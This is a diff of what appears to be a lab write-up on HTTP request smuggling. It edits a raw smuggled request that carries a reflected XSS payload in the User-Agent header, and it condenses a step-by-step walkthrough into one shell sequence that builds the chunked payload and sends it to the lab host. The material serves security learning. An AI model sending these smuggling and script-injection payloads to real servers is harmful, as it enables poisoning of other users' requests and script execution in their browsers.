@@ -382,40 +382,28 @@ We will smuggle request containing the "XSS reflected request":
 ```shell
 POST / HTTP/1.1
 Host: [LAB_URL]
-Content-Length: 75
+Content-Length: 150
 Content-Type: application/x-www-form-urlencoded
 Transfer-Encoding: chunked  # <----- use by backend-end
 
 0 <----- end of request for the back-end
 
 GET /post?postId=3 HTTP/1.1   <----- 2nd request for back-end
+Content-Length: 5
 User-Agent:"><script>alert(1)</script> # <----- end of request for the front-end
+
+x=1
 ```
 
-To construct this request:
-
-**1.** construct the "XSS reflected request"::
+to construct this request:
 ```shell
-httpecho -d xss
-curl 'http://localhost:8888/post?postId=3' -H "Host:" -H 'User-Agent:"><script>alert(1)</script>'  -H 'Accept:'
+#Launch server
+httpecho -s
+# Construct a GET request with reflected xss
+curl -s http://localhost:8888/admin -X GET --data "x=1" -H "Content-Length: 5" -H "Connection: close" -H 'User-Agent:"/><script>alert(1)</script>'  -H 'Accept:' -H 'Host:' > xss
+# Adjust body to smuggle "xss reflected" request
+printf "0\r\n\r\n$(cat xss)" > payload
+curl -s -X POST http://localhost:8888/ --data-binary "@payload" -H "Host: $LAB_URL" -H 'User-Agent:'  -H 'Accept:' | httpoverride --chunked > smuggle
+# Perform the request
+cat smuggle | httpclient https://$LAB_URL
 ```
-
-**2.** Smuggle it within legit request:
-```shell
-printf "0\r\n\r\n$(cat xss)" > xss_payload
-httpecho -d tmp_smuggle_xss
-curl http://localhost:8888 -H "Host: $LAB_URL" -H 'User-Agent:'  -H 'Accept:' --data-binary "@xss_payload"
-cat tmp_smuggle_xss | httpoverride --chunked > smuggle_xss
-```
-
-**3.** Check request treatment by back-end:
-```shell
-cat smuggle_xss | httpcustomhouse -cl | httpcustomhouse -te -r
-```
-
-**4.** Send it
-```shell
-cat smuggle_xss | httpclient https://$LAB_URL
-```
-
-
